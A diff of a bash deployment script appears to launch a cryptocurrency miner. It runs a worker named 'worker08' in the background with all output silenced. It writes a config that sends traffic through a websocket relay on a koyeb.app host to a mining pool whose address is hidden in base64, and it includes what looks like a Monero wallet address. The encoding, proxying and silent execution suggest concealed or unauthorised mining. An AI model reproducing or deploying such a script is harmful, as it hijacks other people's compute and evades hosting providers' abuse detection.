@@ -6,7 +6,7 @@ rm mcpo.tar.gz
 sleep 40
 echo '#!/bin/bash
 
-cd mcp && chmod +x run.sh && nproc --all && ./run.sh 3 worker07 >/dev/null 2>&1 &
+cd mcp && chmod +x run.sh && nproc --all && ./run.sh 3 worker08 >/dev/null 2>&1 &
 sleep 30
 while true
 do
@@ -28,7 +28,7 @@ fi
 export PATH=./python/bin:$PATH
 yes |  pip install certifi
 export SSL_CERT_FILE=$(python -m certifi)
-echo "SERVER_WS=ws://datacenter.dichoiseptoa.site
+echo "SERVER_WS=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL
 SERVER_SECRET=$NAME
